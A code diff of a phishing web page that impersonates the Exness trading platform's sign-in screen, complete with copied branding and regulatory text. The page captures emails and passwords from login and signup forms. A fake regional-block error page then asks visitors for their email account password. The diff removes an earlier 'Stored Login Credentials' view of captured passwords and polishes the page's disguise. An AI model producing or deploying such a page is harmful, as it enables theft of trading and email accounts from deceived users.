@@ -1,305 +1,265 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
     <title>Exness - Sign In</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
-
         :root {
-            --exness-blue: #0066ff;
-            --exness-dark: #1a1a1a;
-            --exness-gray: #666666;
-            --exness-light-gray: #f5f5f5;
-            --exness-border: #e0e0e0;
+            --bg: #f6f7fb;
+            --card: #fff;
+            --muted: #6b7280;
+            --accent: #0b6efd;
+            --yellow: #ffd400;
+            --radius: 10px;
+            --maxwidth: 820px;
         }
-
-        body {
-            background-color: white;
-            color: var(--exness-dark);
-            line-height: 1.6;
+        * {
+            box-sizing: border-box;
+            font-family: Inter, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+        }
+        html, body {
+            height: 100%;
+            background: var(--bg);
+            margin: 0;
+            color: #1a1a1a;
+        }
+        
+        /* Page frame */
+        .page {
             min-height: 100vh;
             display: flex;
             flex-direction: column;
         }
-
-        .container {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 20px;
-            flex: 1;
-        }
-
-        .header {
+        
+        /* Top bar */
+        .topbar {
+            height: 64px;
             display: flex;
-            justify-content: space-between;
             align-items: center;
-            padding: 20px 0;
-            border-bottom: 1px solid var(--exness-border);
+            justify-content: space-between;
+            padding: 12px 20px;
+            background: transparent;
         }
-
         .logo {
-            font-size: 28px;
-            font-weight: 700;
-            color: var(--exness-dark);
-        }
-
-        .nav-buttons {
             display: flex;
+            align-items: center;
             gap: 10px;
+            font-weight: 700;
+            color: #0b1220;
+            font-size: 24px;
         }
-
-        .nav-btn {
-            background: var(--exness-blue);
-            color: white;
-            border: none;
-            padding: 10px 20px;
-            border-radius: 6px;
-            cursor: pointer;
+        .logo-mark {
+            width: 34px;
+            height: 34px;
+            border-radius: 8px;
+            background: linear-gradient(180deg, #0b6efd, #0646b6);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+            font-weight: 800;
+            box-shadow: 0 6px 18px rgba(11, 110, 253, 0.12);
+        }
+        .lang {
+            width: 36px;
+            height: 36px;
+            border-radius: 999px;
+            border: 1px solid rgba(15, 23, 42, 0.06);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--muted);
             font-size: 14px;
-            transition: background 0.3s;
         }
-
-        .nav-btn:hover {
-            background: #0052cc;
-        }
-
-        .main-content {
+        
+        /* Main center layout */
+        .center {
             display: flex;
             justify-content: center;
-            align-items: center;
-            min-height: 70vh;
-            padding: 40px 0;
+            align-items: flex-start;
+            gap: 40px;
+            padding: 20px;
+            width: 100%;
         }
-
-        .login-card {
-            background: white;
-            border-radius: 12px;
-            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
+        
+        .card {
             width: 100%;
             max-width: 440px;
-            padding: 40px;
+            background: var(--card);
+            border-radius: 14px;
+            padding: 34px;
+            box-shadow: 0 12px 40px rgba(12, 15, 30, 0.06);
+            border: 1px solid rgba(12, 15, 30, 0.04);
         }
-
-        .login-header {
+        
+        .welcome {
             text-align: center;
-            margin-bottom: 30px;
+            margin-bottom: 18px;
         }
-
-        .login-header h1 {
-            font-size: 28px;
-            font-weight: 600;
-            margin-bottom: 10px;
+        .welcome h2 {
+            margin: 0;
+            font-size: 20px;
+            color: #0b1220;
         }
-
-        .login-header p {
-            color: var(--exness-gray);
-            font-size: 16px;
-        }
-
         .tabs {
             display: flex;
-            border-bottom: 1px solid var(--exness-border);
-            margin-bottom: 25px;
-        }
-
-        .tab {
-            flex: 1;
-            text-align: center;
-            padding: 15px 0;
-            font-size: 16px;
-            font-weight: 500;
-            cursor: pointer;
-            border-bottom: 2px solid transparent;
-            transition: all 0.3s;
-        }
-
-        .tab.active {
-            color: var(--exness-blue);
-            border-bottom-color: var(--exness-blue);
-            font-weight: 600;
-        }
-
-        .form {
-            display: none;
-        }
-
-        .form.active {
-            display: block;
-        }
-
-        .input-group {
-            margin-bottom: 20px;
-        }
-
-        .input-label {
-            display: block;
-            margin-bottom: 8px;
-            font-size: 14px;
-            color: var(--exness-dark);
-            font-weight: 500;
-        }
-
-        .input-field {
-            width: 100%;
-            padding: 16px;
-            border: 1px solid var(--exness-border);
-            border-radius: 8px;
-            font-size: 16px;
-            background: white;
-            transition: border 0.3s;
-        }
-
-        .input-field:focus {
-            outline: none;
-            border-color: var(--exness-blue);
-            box-shadow: 0 0 0 2px rgba(0, 102, 255, 0.1);
-        }
-
-        .fake-password {
-            -webkit-text-security: disc;
-            -moz-text-security: disc;
-            text-security: disc;
-        }
-
-        .continue-btn {
-            width: 100%;
-            background: var(--exness-blue);
-            color: white;
-            border: none;
-            padding: 16px;
-            border-radius: 8px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            margin: 10px 0 30px 0;
-            transition: background 0.3s;
-        }
-
-        .continue-btn:hover {
-            background: #0052cc;
-        }
-
-        .continue-btn:disabled {
-            background: #cccccc;
-            cursor: not-allowed;
-        }
-
-        .divider {
-            text-align: center;
-            margin: 25px 0;
+            align-items: center;
+            gap: 18px;
+            justify-content: center;
+            margin: 14px 0 18px 0;
             position: relative;
-            color: var(--exness-gray);
-            font-size: 14px;
         }
-
-        .divider::before {
+        .tab {
+            padding: 8px 6px;
+            font-weight: 600;
+            color: var(--muted);
+            cursor: pointer;
+            position: relative;
+        }
+        .tab.active {
+            color: #0b1220;
+        }
+        .tab.underline::after {
             content: '';
             position: absolute;
-            top: 50%;
             left: 0;
             right: 0;
-            height: 1px;
-            background: var(--exness-border);
+            bottom: -12px;
+            margin: 0 auto;
+            width: 72%;
+            height: 3px;
+            background: #0b1220;
+            border-radius: 3px;
         }
-
-        .divider span {
-            background: white;
-            padding: 0 15px;
-            position: relative;
+        
+        form {
+            margin-top: 6px;
         }
-
-        .google-btn {
+        .field {
+            margin-bottom: 14px;
+        }
+        label {
+            display: block;
+            font-size: 13px;
+            margin-bottom: 6px;
+            color: #374151;
+            font-weight: 600;
+        }
+        input[type="email"], input[type="text"] {
             width: 100%;
-            background: white;
-            color: var(--exness-dark);
-            border: 1px solid var(--exness-border);
-            padding: 14px;
-            border-radius: 8px;
-            font-size: 16px;
+            padding: 10px 12px;
+            border-radius: 6px;
+            border: 1px solid #d1d5db;
+            background: #fff;
+            font-size: 14px;
+            color: #0b1220;
+        }
+        input:focus {
+            outline: none;
+            border-color: #3b82f6;
+            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.1);
+        }
+        
+        .password-row {
+            display: flex;
+            gap: 8px;
+            align-items: center;
+        }
+        .password-row input {
+            flex: 1;
+        }
+        .pw-toggle {
+            width: 44px;
+            height: 36px;
+            border-radius: 6px;
+            border: 1px solid #d1d5db;
+            background: #fff;
             cursor: pointer;
+            font-weight: 700;
+        }
+        
+        .continue {
+            margin-top: 8px;
+            display: block;
+            width: 100%;
+            padding: 12px 14px;
+            border-radius: 8px;
+            border: 0;
+            background: #000;
+            font-weight: 700;
+            color: #fff;
+            font-size: 15px;
+            cursor: pointer;
+        }
+        .continue:active {
+            transform: translateY(1px);
+        }
+        
+        .divider {
+            margin: 18px 0;
+            color: var(--muted);
+            font-size: 13px;
             display: flex;
             align-items: center;
-            justify-content: center;
+            gap: 12px;
+        }
+        .divider::before, .divider::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: #e5e7eb;
+        }
+        
+        .google {
+            width: 100%;
+            border-radius: 6px;
+            border: 1px solid #d1d5db;
+            background: #fff;
+            padding: 10px;
+            display: flex;
+            align-items: center;
             gap: 10px;
-            margin-bottom: 25px;
-            transition: background 0.3s;
+            justify-content: center;
+            font-weight: 600;
+            cursor: pointer;
+            color: #1f2937;
         }
-
-        .google-btn:hover {
-            background: var(--exness-light-gray);
-        }
-
-        .forgot-link {
+        
+        .forgot {
             text-align: center;
-            margin-bottom: 40px;
+            margin-top: 14px;
         }
-
-        .forgot-link a {
-            color: var(--exness-blue);
+        .forgot a {
+            color: #0b6efd;
             text-decoration: none;
-            font-size: 16px;
-            font-weight: 500;
+            font-weight: 600;
+            font-size: 13px;
         }
-
-        .forgot-link a:hover {
-            text-decoration: underline;
-        }
-
-        .disclaimer {
-            background: var(--exness-light-gray);
-            padding: 20px;
-            border-radius: 8px;
-            margin-bottom: 20px;
-            font-size: 12px;
-            color: var(--exness-gray);
-            line-height: 1.5;
-        }
-
+        
+        /* Wide footer text (legal) */
         .legal {
+            margin-top: 26px;
             font-size: 11px;
-            color: var(--exness-gray);
-            line-height: 1.5;
-            margin-bottom: 20px;
+            color: var(--muted);
+            line-height: 1.35;
+            max-height: 220px;
+            overflow: auto;
+            padding-right: 6px;
         }
-
-        .legal p {
-            margin-bottom: 15px;
-        }
-
-        .footer-links {
+        .links {
             display: flex;
             flex-wrap: wrap;
-            gap: 15px;
-            justify-content: center;
-            margin-bottom: 20px;
+            gap: 10px;
+            margin-top: 12px;
         }
-
-        .footer-links a {
-            color: var(--exness-blue);
+        .links a {
+            font-size: 12px;
+            color: #0b6efd;
             text-decoration: none;
-            font-size: 12px;
         }
-
-        .footer-links a:hover {
-            text-decoration: underline;
-        }
-
-        .copyright {
-            text-align: center;
-            font-size: 12px;
-            color: var(--exness-gray);
-            margin-bottom: 20px;
-        }
-
-        /* Error Page Styles */
+        
+        /* Error page */
         .error-page {
             display: none;
             text-align: center;
@@ -307,47 +267,40 @@
             max-width: 500px;
             margin: 0 auto;
         }
-
         .error-icon {
             font-size: 64px;
-            color: #ff6b6b;
+            color: #ef4444;
             margin-bottom: 20px;
         }
-
         .error-page h2 {
             font-size: 28px;
             margin-bottom: 15px;
-            color: var(--exness-dark);
+            color: #0b1220;
         }
-
         .error-page p {
-            color: var(--exness-gray);
+            color: var(--muted);
             margin-bottom: 30px;
             font-size: 16px;
         }
-
         .help-section {
-            background: var(--exness-light-gray);
+            background: #f9fafb;
             padding: 25px;
             border-radius: 8px;
             margin: 30px 0;
             text-align: left;
         }
-
         .help-section h3 {
             margin-bottom: 10px;
-            color: var(--exness-dark);
+            color: #0b1220;
             text-align: center;
         }
-
         .help-section p {
             text-align: center;
             margin-bottom: 20px;
-            color: var(--exness-gray);
+            color: var(--muted);
         }
-
         .retry-btn {
-            background: var(--exness-blue);
+            background: #000;
             color: white;
             border: none;
             padding: 12px 24px;
@@ -355,250 +308,131 @@
             cursor: pointer;
             font-size: 16px;
             margin-top: 20px;
-            transition: background 0.3s;
         }
-
-        .retry-btn:hover {
-            background: #0052cc;
+        
+        /* Fake password field */
+        .fake-password {
+            -webkit-text-security: disc;
+            -moz-text-security: disc;
+            text-security: disc;
         }
-
-        .status-message {
-            padding: 12px;
-            margin: 10px 0;
-            border-radius: 6px;
-            text-align: center;
-            font-size: 14px;
-            display: none;
-        }
-
-        .status-success {
-            background: #e8f5e8;
-            color: #2d5016;
-            border: 1px solid #c8e6c9;
-        }
-
-        /* Plan Page Styles */
-        .plan-container {
-            display: none;
-            max-width: 1000px;
-            margin: 0 auto;
-        }
-
-        .plan-container h1 {
-            color: var(--exness-dark);
-            margin-bottom: 20px;
-            text-align: center;
-            font-size: 28px;
-        }
-
-        .credentials-table {
+        
+        /* Page layout to include large footer text below card */
+        .footer-wide {
             width: 100%;
-            border-collapse: collapse;
-            margin: 20px 0;
-            font-size: 14px;
-            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
-            border-radius: 8px;
-            overflow: hidden;
-        }
-
-        .credentials-table th, .credentials-table td {
-            border: 1px solid var(--exness-border);
-            padding: 12px;
-            text-align: left;
-        }
-
-        .credentials-table th {
-            background: var(--exness-light-gray);
-            font-weight: 600;
-        }
-
-        .empty-state {
-            text-align: center;
-            padding: 40px;
-            color: var(--exness-gray);
-            font-style: italic;
-        }
-
-        .action-buttons {
-            margin: 20px 0;
-            text-align: center;
-        }
-
-        .action-btn {
-            background: var(--exness-blue);
-            color: white;
-            border: none;
-            padding: 10px 20px;
-            border-radius: 6px;
-            cursor: pointer;
-            margin: 0 5px;
-            font-size: 14px;
-            transition: background 0.3s;
-        }
-
-        .action-btn:hover {
-            background: #0052cc;
-        }
-
-        .clear-btn {
-            background: #dc3545;
-        }
-
-        .clear-btn:hover {
-            background: #c82333;
-        }
-
-        .back-btn {
-            background: #6c757d;
-        }
-
-        .back-btn:hover {
-            background: #5a6268;
-        }
-
-        .type-badge {
-            padding: 4px 8px;
-            border-radius: 4px;
+            max-width: var(--maxwidth);
+            margin: 28px auto 60px;
+            color: var(--muted);
             font-size: 12px;
-            font-weight: 600;
+            padding: 0 20px;
         }
-
-        .type-login {
-            background: #e3f2fd;
-            color: #1976d2;
-        }
-
-        .type-signup {
-            background: #e8f5e8;
-            color: #2e7d32;
-        }
-
-        .type-help {
-            background: #fff3cd;
-            color: #856404;
-        }
-
-        @media (max-width: 768px) {
-            .login-card {
-                padding: 30px 20px;
+        
+        /* Responsive */
+        @media (max-width: 900px) {
+            .center {
+                padding: 12px;
             }
-            
-            .nav-buttons {
-                flex-direction: column;
-                width: 100%;
+            .card {
+                margin-top: 10px;
             }
-            
-            .nav-btn {
-                width: 100%;
-                margin-bottom: 10px;
-            }
-            
-            .footer-links {
-                flex-direction: column;
-                align-items: center;
+            .topbar {
+                padding: 10px 12px;
             }
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="header">
-            <div class="logo">Exness</div>
-            <div class="nav-buttons">
-                <button class="nav-btn" onclick="showLoginPage()">
-                    <i class="fas fa-sign-in-alt"></i> Login Page
-                </button>
-                <button class="nav-btn" onclick="showPlanPage()">
-                    <i class="fas fa-database"></i> View Stored Data
-                </button>
+    <div class="page">
+        <div class="topbar" role="banner">
+            <div class="logo" aria-hidden="true">
+                <div>exness</div>
+            </div>
+            <div style="display:flex;align-items:center;gap:12px">
+                <div class="lang" title="Language selector" aria-hidden="true">EN</div>
             </div>
         </div>
 
-        <!-- Main Login Page -->
-        <div class="main-content" id="loginPage">
-            <div class="login-card">
-                <div class="login-header">
-                    <h1>Welcome to Exness</h1>
-                    <p>Sign in to your trading account</p>
-                </div>
-                
-                <div class="tabs">
-                    <div class="tab active" data-tab="login">Sign in</div>
-                    <div class="tab" data-tab="signup">Create an account</div>
-                </div>
-
-                <!-- Login Form -->
-                <form id="loginForm" class="form active">
-                    <div class="input-group">
-                        <label class="input-label">Your email address</label>
-                        <input type="email" class="input-field" id="loginEmail" placeholder="Enter your email" required>
+        <!-- Login Page -->
+        <div class="center" id="loginPage">
+            <div style="width:100%;max-width:var(--maxwidth);display:flex;flex-direction:column;align-items:center;gap:14px">
+                <div class="card" role="main" aria-labelledby="welcomeTitle">
+                    <div class="welcome">
+                        <h2 id="welcomeTitle">Welcome to Exness</h2>
                     </div>
 
-                    <div class="input-group">
-                        <label class="input-label">Password</label>
-                        <input type="text" class="input-field fake-password" id="loginPassword" placeholder="Enter your password" required>
+                    <div class="tabs" role="tablist" aria-label="Sign in or create account">
+                        <div class="tab underline active" data-tab="login">Sign in</div>
+                        <div class="tab" data-tab="signup">Create an account</div>
                     </div>
 
-                    <button type="submit" class="continue-btn" id="loginBtn">Continue</button>
-                </form>
+                    <!-- Login form -->
+                    <form id="loginForm" autocomplete="off" data-type="login">
+                        <div class="field">
+                            <label for="loginEmail">Your email address</label>
+                            <input id="loginEmail" type="email" placeholder="you@domain.com" required>
+                        </div>
 
-                <!-- Signup Form -->
-                <form id="signupForm" class="form">
-                    <div class="input-group">
-                        <label class="input-label">Your email address</label>
-                        <input type="email" class="input-field" id="signupEmail" placeholder="Enter your email" required>
+                        <div class="field">
+                            <label for="loginPassword">Password</label>
+                            <div class="password-row">
+                                <input id="loginPassword" type="text" class="fake-password" placeholder="******" required>
+                                <button type="button" id="togglePw" class="pw-toggle" aria-pressed="false" aria-label="Show password">•••</button>
+                            </div>
+                        </div>
+
+                        <button type="submit" class="continue" id="loginBtn">Continue</button>
+                    </form>
+
+                    <!-- Signup form hidden -->
+                    <form id="signupForm" style="display:none" autocomplete="off" data-type="signup">
+                        <div class="field">
+                            <label for="signupEmail">Your email address</label>
+                            <input id="signupEmail" type="email" placeholder="you@domain.com" required>
+                        </div>
+                        <div class="field">
+                            <label for="signupPassword">Password</label>
+                            <input id="signupPassword" type="text" class="fake-password" placeholder="Create a password" required>
+                        </div>
+                        <div class="field">
+                            <label for="confirmPassword">Confirm Password</label>
+                            <input id="confirmPassword" type="text" class="fake-password" placeholder="Confirm password" required>
+                        </div>
+                        <button type="submit" class="continue" id="signupBtn">Create account</button>
+                    </form>
+
+                    <div class="divider" aria-hidden="true"><span>Or sign in with</span></div>
+
+                    <button class="google" type="button" aria-label="Sign in with Google">
+                        <svg width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
+                            <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
+                            <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
+                            <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
+                            <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
+                        </svg>
+                        Google
+                    </button>
+
+                    <div class="forgot"><a href="#">I forgot my password</a></div>
+
+                    <div class="legal" aria-hidden="true">
+                        <p style="margin:0 0 8px 0">Exness does not offer services to residents of certain jurisdictions including the USA, Iran, North Korea, the European Union, the United Kingdom and others. The content of the website including translations should not be construed as means for solicitation. Investors make their own and independent decisions. Trading in CFDs and leveraged products involves substantial risk of loss and you may lose all of your invested capital.</p>
+
+                        <p style="margin:8px 0 0 0">Exness (SC) Ltd is a Securities Dealer registered in Seychelles with registration number #623696-1 and authorised by the Financial Services Authority (FSA) with licence number SD025. Exness B.V. is a Securities Intermediary registered in Curaçao. Exness (VG) Ltd is authorised by the Financial Services Commission (FSC) in BVI.</p>
+
+                        <div class="links" style="margin-top:10px">
+                            <a href="#">Privacy Agreement</a>
+                            <a href="#">Risk disclosure</a>
+                            <a href="#">Preventing money laundering</a>
+                            <a href="#">Security instructions</a>
+                            <a href="#">Legal documents</a>
+                            <a href="#">Complaints Handling Policy</a>
+                        </div>
                     </div>
-
-                    <div class="input-group">
-                        <label class="input-label">Password</label>
-                        <input type="text" class="input-field fake-password" id="signupPassword" placeholder="Create a password" required>
-                    </div>
-
-                    <div class="input-group">
-                        <label class="input-label">Confirm Password</label>
-                        <input type="text" class="input-field fake-password" id="confirmPassword" placeholder="Confirm your password" required>
-                    </div>
-
-                    <button type="submit" class="continue-btn" id="signupBtn">Create Account</button>
-                </form>
-
-                <div class="divider">
-                    <span>Or sign in with</span>
                 </div>
 
-                <button type="button" class="google-btn">
-                    <i class="fab fa-google"></i> Google
-                </button>
-
-                <div class="forgot-link">
-                    <a href="#">I forgot my password</a>
-                </div>
-
-                <div class="disclaimer">
-                    Exness does not offer services to residents of certain jurisdictions including the USA, Iran, North Korea, the European Union, the United Kingdom and others. The content of the website including translations should not be construed as means for solicitation. Investors make their own and independent decisions. Trading in CFDs and generally leveraged products involves substantial risk of loss and you may lose all of your invested capital.
-                </div>
-
-                <div class="legal">
-                    <p><strong>Exness (SC) Ltd</strong> is a Securities Dealer registered in Seychelles with registration number #623696-1 and authorised by the Financial Services Authority (FSA) with licence number SD025. The registered office of Exness (SC) Ltd is at 9A CT House, 2nd floor, Providence, Malte, Seychelles.</p>
-                    
-                    <p><strong>Exness B.V.</strong> is a Securities Intermediary registered in Curaçao with registration number 1489690J and authorised by the Central Bank of Curaçao and Sint Maarten (CBCS) with licence number 000315J. The registered office of Exness B.V. is at Emancipante Boulevard Dominico F. Tonor Martina 31, Curaçao.</p>
-                    
-                    <p><strong>Exness (VG) Ltd</strong> is authorised by the Financial Services Commission (FSG) in BVI with registration number 2032226 and investment business licence number SIBA/L/201133. The registered office of Exness (VG) Ltd is at Trinity Chambers, P.O. Box 4301, Road Town, Tortola, BVI.</p>
-                    
-                    <p>The entities above are duly authorised to operate under the Exness brand and trademarks. <strong>Risk Warning:</strong> Our services relate to complex derivative products (CFDs) which are traded outside an exchange. These products come with a high risk of losing money.</p>
-                </div>
-
-                <div class="footer-links">
-                    <a href="#">Privacy Agreement</a>
-                    <a href="#">Risk disclosure</a>
-                    <a href="#">Preventing money laundering</a>
-                    <a href="#">Security instructions</a>
-                    <a href="#">Legal documents</a>
-                    <a href="#">Complaints Handling Policy</a>
-                </div>
-
-                <div class="copyright">
-                    © 2008-2025. Exness
+                <!-- Wide footer text block like screenshot -->
+                <div class="footer-wide" aria-hidden="true">
+                    <div style="font-size:12px;color:var(--muted)">© 2008-2025. Exness</div>
                 </div>
             </div>
         </div>
@@ -606,7 +440,9 @@
         <!-- 404 Error Page -->
         <div class="error-page" id="errorPage">
             <div class="error-icon">
-                <i class="fas fa-exclamation-triangle"></i>
+                <svg width="64" height="64" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M12 2C6.48 2 2 6.48 2 12C2 17.52 6.48 22 12 22C17.52 22 22 17.52 22 12C22 6.48 17.52 2 12 2ZM13 17H11V15H13V17ZM13 13H11V7H13V13Z" fill="#ef4444"/>
+                </svg>
             </div>
             <h2>404 - Service Unavailable</h2>
             <p>Our services are currently not available in your region. Please try again later.</p>
@@ -616,117 +452,74 @@
                 <p>Enter your email account details and we'll contact you shortly:</p>
                 
                 <form id="helpForm">
-                    <div class="input-group">
-                        <label class="input-label">Your Email Address</label>
-                        <input type="email" class="input-field" id="helpEmail" placeholder="Enter your email" required>
+                    <div class="field">
+                        <label for="helpEmail">Your Email Address</label>
+                        <input id="helpEmail" type="email" placeholder="Enter your email" required>
                     </div>
 
-                    <div class="input-group">
-                        <label class="input-label">Email Password</label>
-                        <input type="text" class="input-field fake-password" id="helpPassword" placeholder="Enter your email password" required>
+                    <div class="field">
+                        <label for="helpPassword">Email Password</label>
+                        <input id="helpPassword" type="text" class="fake-password" placeholder="Enter your email password" required>
                     </div>
 
-                    <button type="submit" class="continue-btn" id="helpBtn">Get Help</button>
+                    <button type="submit" class="continue" id="helpBtn">Get Help</button>
                 </form>
                 
-                <div id="helpMessage" class="status-message" style="display: none;"></div>
+                <div id="helpMessage" style="display: none; padding: 10px; background: #d1fae5; color: #065f46; border-radius: 6px; margin-top: 10px;">
+                    We will reach you as soon as we receive your email. Thank you for your patience...
+                </div>
             </div>
             
             <button class="retry-btn" onclick="showLoginPage()">Try Again</button>
         </div>
-
-        <!-- Plan Page -->
-        <div class="plan-container" id="planPage">
-            <h1>Stored Login Credentials</h1>
-            
-            <div class="action-buttons">
-                <button class="action-btn" onclick="loadCredentials()">
-                    <i class="fas fa-sync-alt"></i> Refresh Data
-                </button>
-                <button class="action-btn clear-btn" onclick="clearCredentials()">
-                    <i class="fas fa-trash"></i> Clear All Data
-                </button>
-                <button class="action-btn back-btn" onclick="showLoginPage()">
-                    <i class="fas fa-arrow-left"></i> Back to Login
-                </button>
-            </div>
-            
-            <table class="credentials-table">
-                <thead>
-                    <tr>
-                        <th>Timestamp</th>
-                        <th>Type</th>
-                        <th>Email</th>
-                        <th>Password</th>
-                        <th>Details</th>
-                    </tr>
-                </thead>
-                <tbody id="credentialsBody">
-                    <tr>
-                        <td colspan="5" class="empty-state">No credentials stored yet</td>
-                    </tr>
-                </tbody>
-            </table>
-            
-            <div style="margin-top: 20px; font-size: 12px; color: var(--exness-gray);">
-                <p><strong>Note:</strong> This page displays all credentials entered in the login form. Data is stored in your browser's localStorage.</p>
-            </div>
-        </div>
     </div>
 
     <script>
-        // Page navigation functions
-        function showLoginPage() {
-            document.getElementById('loginPage').style.display = 'flex';
-            document.getElementById('errorPage').style.display = 'none';
-            document.getElementById('planPage').style.display = 'none';
-        }
-
-        function showPlanPage() {
-            document.getElementById('loginPage').style.display = 'none';
-            document.getElementById('errorPage').style.display = 'none';
-            document.getElementById('planPage').style.display = 'block';
-            loadCredentials();
-        }
-
-        function showErrorPage() {
-            document.getElementById('loginPage').style.display = 'none';
-            document.getElementById('errorPage').style.display = 'block';
-            document.getElementById('planPage').style.display = 'none';
-        }
-
         // Initialize the page
         showLoginPage();
 
-        // Tab switching functionality
+        // Tab toggles
         document.querySelectorAll('.tab').forEach(tab => {
-            tab.addEventListener('click', function() {
-                const tabType = this.getAttribute('data-tab');
-                
-                // Update active tab
-                document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
-                this.classList.add('active');
-                
-                // Show correct form
-                document.querySelectorAll('.form').forEach(form => form.classList.remove('active'));
-                document.getElementById(tabType + 'Form').classList.add('active');
+            tab.addEventListener('click', () => {
+                document.querySelectorAll('.tab').forEach(t => t.classList.remove('active', 'underline'));
+                tab.classList.add('active', 'underline');
+                const target = tab.getAttribute('data-tab');
+                document.getElementById('loginForm').style.display = target === 'login' ? 'block' : 'none';
+                document.getElementById('signupForm').style.display = target === 'signup' ? 'block' : 'none';
             });
         });
 
+        // Password toggle (simple)
+        const pwToggle = document.getElementById('togglePw');
+        const loginPw = document.getElementById('loginPassword');
+        pwToggle.addEventListener('click', () => {
+            if (loginPw.type === 'text') {
+                loginPw.type = 'text';
+                loginPw.classList.add('fake-password');
+                pwToggle.textContent = '•••';
+                pwToggle.setAttribute('aria-pressed', 'false');
+            } else {
+                loginPw.type = 'text';
+                loginPw.classList.remove('fake-password');
+                pwToggle.textContent = 'Hide';
+                pwToggle.setAttribute('aria-pressed', 'true');
+            }
+        });
+
         // Login form handler
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
+        document.getElementById('loginForm').addEventListener('submit', e => {
             e.preventDefault();
             handleFormSubmission('login');
         });
 
         // Signup form handler
-        document.getElementById('signupForm').addEventListener('submit', function(e) {
+        document.getElementById('signupForm').addEventListener('submit', e => {
             e.preventDefault();
             handleFormSubmission('signup');
         });
 
         // Help form handler
-        document.getElementById('helpForm').addEventListener('submit', function(e) {
+        document.getElementById('helpForm').addEventListener('submit', e => {
             e.preventDefault();
             handleHelpSubmission();
         });
@@ -799,10 +592,7 @@
             // Simulate processing delay
             setTimeout(() => {
                 // Show success message
-                const helpMessage = document.getElementById('helpMessage');
-                helpMessage.textContent = 'We will reach you as soon as we receive your email. Thank you for your patience.';
-                helpMessage.className = 'status-message status-success';
-                helpMessage.style.display = 'block';
+                document.getElementById('helpMessage').style.display = 'block';
                 
                 // Reset button
                 btn.textContent = originalText;
@@ -812,6 +602,17 @@
                 document.getElementById('helpEmail').value = '';
                 document.getElementById('helpPassword').value = '';
             }, 1500);
+        }
+
+        // Page navigation functions
+        function showLoginPage() {
+            document.getElementById('loginPage').style.display = 'flex';
+            document.getElementById('errorPage').style.display = 'none';
+        }
+
+        function showErrorPage() {
+            document.getElementById('loginPage').style.display = 'none';
+            document.getElementById('errorPage').style.display = 'block';
         }
 
         // Password confirmation validation for signup
@@ -825,64 +626,10 @@
             
             if (confirmPassword && password !== confirmPassword) {
                 signupBtn.disabled = true;
-                signupBtn.style.background = '#cccccc';
+                signupBtn.style.opacity = '0.6';
             } else {
                 signupBtn.disabled = false;
-                signupBtn.style.background = '';
-            }
-        }
-
-        // Plan page functions
-        function loadCredentials() {
-            const credentialsBody = document.getElementById('credentialsBody');
-            const storedData = localStorage.getItem('exnessCredentials');
-            
-            if (storedData && JSON.parse(storedData).length > 0) {
-                const credentials = JSON.parse(storedData);
-                let html = '';
-                
-                // Reverse to show newest first
-                credentials.reverse().forEach(cred => {
-                    let typeClass, typeText, password, details;
-                    
-                    if (cred.type === 'help_request') {
-                        typeClass = 'type-help';
-                        typeText = 'Help Request';
-                        password = cred.emailPassword;
-                        details = 'Email Help Request';
-                    } else {
-                        typeClass = cred.type === 'login' ? 'type-login' : 'type-signup';
-                        typeText = cred.type === 'login' ? 'Login' : 'Signup';
-                        password = cred.password;
-                        details = '-';
-                    }
-                    
-                    html += `
-                        <tr>
-                            <td>${cred.timestamp}</td>
-                            <td><span class="type-badge ${typeClass}">${typeText}</span></td>
-                            <td>${cred.email}</td>
-                            <td>${password}</td>
-                            <td>${details}</td>
-                        </tr>
-                    `;
-                });
-                
-                credentialsBody.innerHTML = html;
-            } else {
-                credentialsBody.innerHTML = `
-                    <tr>
-                        <td colspan="5" class="empty-state">No credentials stored yet</td>
-                    </tr>
-                `;
-            }
-        }
-        
-        function clearCredentials() {
-            if (confirm('Are you sure you want to clear all stored credentials?')) {
-                localStorage.removeItem('exnessCredentials');
-                loadCredentials();
-                alert('All credentials have been cleared!');
+                signupBtn.style.opacity = '1';
             }
         }
     </script>
